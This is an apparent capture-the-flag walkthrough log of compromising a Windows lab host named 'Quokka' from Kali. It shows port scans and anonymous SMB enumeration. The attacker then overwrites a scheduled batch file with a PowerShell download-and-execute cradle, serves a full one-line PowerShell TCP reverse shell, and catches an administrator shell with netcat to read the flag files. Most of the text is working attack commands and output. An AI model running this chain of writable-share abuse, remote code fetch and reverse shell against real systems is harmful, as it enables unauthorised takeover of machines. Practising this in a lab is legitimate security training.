└─$ cat scan.txt
# Nmap 7.95 scan initiated Thu Sep 25 15:33:23 2025 as: /usr/lib/nmap/nmap --privileged -sS -p- --open --min-rate 5000 -n -Pn -oN scan.txt 192.168.69.7
Nmap scan report for 192.168.69.7
Host is up (0.00047s latency).
Not shown: 58816 closed tcp ports (reset), 6706 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
MAC Address: 08:00:27:8E:CC:2E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

# Nmap done at Thu Sep 25 15:33:36 2025 -- 1 IP address (1 host up) scanned in 13.09 seconds
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Quokka]
└─$ 


====================================================================================================================================================================================
──(kali㉿kali)-[~/Documents/Quokka]
└─$ cat fullscan.txt 
# Nmap 7.95 scan initiated Thu Sep 25 15:34:40 2025 as: /usr/lib/nmap/nmap --privileged -sVC -p135,139,445,47001,49664,49665,49666,49667,49668,49669,49670,5985,80 -n -Pn -vvv -oN fullscan.txt 192.168.69.7
Warning: Hit PCRE_ERROR_MATCHLIMIT when probing for service http with the regex '^HTTP/1\.1 \d\d\d (?:[^\r\n]*\r\n(?!\r\n))*?.*\r\nServer: Virata-EmWeb/R([\d_]+)\r\nContent-Type: text/html; ?charset=UTF-8\r\nExpires: .*<title>HP (Color |)LaserJet ([\w._ -]+)&nbsp;&nbsp;&nbsp;'
Nmap scan report for 192.168.69.7
Host is up, received arp-response (0.00022s latency).
Scanned at 2025-09-25 15:34:40 EDT for 59s

PORT      STATE SERVICE      REASON          VERSION
80/tcp    open  http         syn-ack ttl 128 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Portfolio y Noticias Tech de Quokka 
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 128 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 128 Windows Server 2016 Datacenter 14393 microsoft-ds
5985/tcp  open  http         syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         syn-ack ttl 128 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
49668/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
49669/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
49670/tcp open  msrpc        syn-ack ttl 128 Microsoft Windows RPC
MAC Address: 08:00:27:8E:CC:2E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 63225/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 62068/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 58078/udp): CLEAN (Timeout)
|   Check 4 (port 64926/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| nbstat: NetBIOS name: WIN-VRU3GG3DPLJ, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:8e:cc:2e (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| Names:
|   WIN-VRU3GG3DPLJ<00>  Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WIN-VRU3GG3DPLJ<20>  Flags: <unique><active>
| Statistics:
|   08:00:27:8e:cc:2e:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_clock-skew: mean: -40m00s, deviation: 1h09m16s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2016 Datacenter 14393 (Windows Server 2016 Datacenter 6.3)
|   Computer name: WIN-VRU3GG3DPLJ
|   NetBIOS computer name: WIN-VRU3GG3DPLJ\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-09-25T21:35:34+02:00
| smb2-time: 
|   date: 2025-09-25T19:35:35
|_  start_date: 2025-09-25T19:28:48
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 25 15:35:39 2025 -- 1 IP address (1 host up) scanned in 59.71 seconds
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Quokka]
└─$ 

====================================================================================================================================================================================


┌──(kali㉿kali)-[~/Documents/Quokka]
└─$ smbclient -L //192.168.69.7 -N        

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Admin remota
        C$              Disk      Recurso predeterminado
        Compartido      Disk      
        IPC$            IPC       IPC remota
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 192.168.69.7 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Documents/Quokka]
└─$ 


====================================================================================================================================================================================





smbclient \\\\192.168.69.7\\Compartido




smb: \Proyectos\Quokka\> ls
  .                                   D        0  Sun Oct 27 10:33:54 2024
  ..                                  D        0  Sun Oct 27 10:33:54 2024
  Código                             D        0  Sun Oct 27 10:58:54 2024
  Diseño                             D        0  Sun Oct 27 10:33:54 2024
  Documentación_Interna.docx         A       71  Sun Oct 27 10:33:54 2024
  Manual_Quokka.pdf                   A        0  Sun Oct 27 10:33:54 2024

                7735807 blocks of size 4096. 5005345 blocks available


smb: \Proyectos\Quokka\> cd Código\
smb: \Proyectos\Quokka\Código\> ls
  .                                   D        0  Sun Oct 27 10:58:54 2024
  ..                                  D        0  Sun Oct 27 10:58:54 2024
  index.html                          A       52  Sun Oct 27 10:33:54 2024
  mantenimiento - copia.bat           A     1252  Sun Oct 27 10:41:43 2024
  mantenimiento.bat                   A      343  Sun Oct 27 10:58:54 2024
  README.md                           A       56  Sun Oct 27 10:33:54 2024

                7735807 blocks of size 4096. 5005345 blocks available
                
smb: \Proyectos\Quokka\Código\> get mantenimiento.bat
getting file \Proyectos\Quokka\Código\mantenimiento.bat of size 343 as mantenimiento.bat (334.9 KiloBytes/sec) (average 55.1 KiloBytes/sec)

smb: \Proyectos\Quokka\Código\> pwd
Current directory is \\192.168.69.7\Compartido\Proyectos\Quokka\Código\


smb: \Proyectos\Quokka\Código\> SMBecho failed (NT_STATUS_CONNECTION_RESET). The connection is disconnected now

                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Documents/Quokka]
└─$ 






====================================================================================================================================================================================


                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Documents/Quokka]
└─$  cat Backup_Policy.txt 
Pol�tica de backups: Se realizar�n copias de seguridad incrementales cada 5 d�as.
                                                                                                                                                                                     


====================================================================================================================================================================================

                                                                                                                                                                                     
┌──(kali㉿kali)-[~/Documents/Quokka]
└─$ file mantenimiento.bat 
mantenimiento.bat: DOS batch file, ISO-8859 text, with CRLF line terminators
 

┌──(kali㉿kali)-[~/Documents/Quokka]
└─$ cat mantenimiento.bat 
@echo off
:: Mantenimiento del sistema de copias de seguridad
:: Este script es ejecutado cada minuto

REM Pista: Tal vez haya algo m�s aqu�...

:: Reverse shell a Kali
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "iex(New-Object Net.WebClient).DownloadString('http://192.168.1.36:8000/shell.ps1')"

:: Fin del script
exit

====================================================================================================================================================================================


https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3

# Reverse PowerShell



┌──(kali㉿kali)-[~/Documents/Quokka]
└─$ cat shell.ps1 
# Nikhil SamratAshok Mittal: http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html

$client = New-Object System.Net.Sockets.TCPClient('192.168.69.3',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
                                                                                                                                                            




====================================================================================================================================================================================
┌──(kali㉿kali)-[~/Documents/Quokka]
└─$ vi mantenimiento.bat 


                                                                                                                                    
┌──(kali㉿kali)-[~/Documents/Quokka]
└─$ cat mantenimiento.bat 
@echo off
:: Mantenimiento del sistema de copias de seguridad
:: Este script es ejecutado cada minuto

REM Pista: Tal vez haya algo m�s aqu�...

:: Reverse shell a Kali
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "iex(New-Object Net.WebClient).DownloadString('http://192.168.69.3:8000/shell.ps1')"

:: Fin del script
exit


┌──(kali㉿kali)-[~/Documents/Quokka]
└─$ smbclient //192.168.69.7/Compartido -N -c "put mantenimiento.bat Proyectos/Quokka/Código/mantenimiento.bat"
putting file mantenimiento.bat as \Proyectos\Quokka\Código\mantenimiento.bat (334.9 kb/s) (average 335.0 kb/s)





┌──(kali㉿kali)-[~/Documents/Quokka]
└─$ python3 -m http.server                              
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
192.168.69.7 - - [25/Sep/2025 16:18:10] "GET /shell.ps1 HTTP/1.1" 200 -






====================================================================================================================================================================================








┌──(kali㉿kali)-[~/Documents/Quokka]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.69.3] from (UNKNOWN) [192.168.69.7] 49721
ls


    Directorio: C:\Windows\system32


PS C:\Windows\system32> whoami
win-vru3gg3dplj\administrador

====================================================================================================================================================================================



 
PS C:\Users> cd Administrador

    Directorio: C:\Users\Administrador\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       27/10/2024     16:16             30 admin.txt                                                             


PS C:\Users\Administrador\Desktop> type admin.txt
j9eCpd89VGOscar4nQp8e842mUOb8U


====================================================================================================================================================================================

PS C:\Users> ls


    Directorio: C:\Users


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       27/10/2024     16:14                0mar                                                                  
d-----       09/06/2024     13:16                Administrador                                                         
d-----       27/10/2024     16:26                Invitado                                                              
d-r---       09/06/2024     13:16                Public                                                                


PS C:\Users> cd 0mar


PS C:\Users\0mar\Desktop> ls


    Directorio: C:\Users\0mar\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       27/10/2024     16:16             25 user.txt                                                              


PS C:\Users\0mar\Desktop> type user.txt
9OWiub9aDwcULNxs4w80W63Jl




PS C:\Users\0mar\Desktop> 


====================================================================================================================================================================================

====================================================================================================================================================================================

====================================================================================================================================================================================

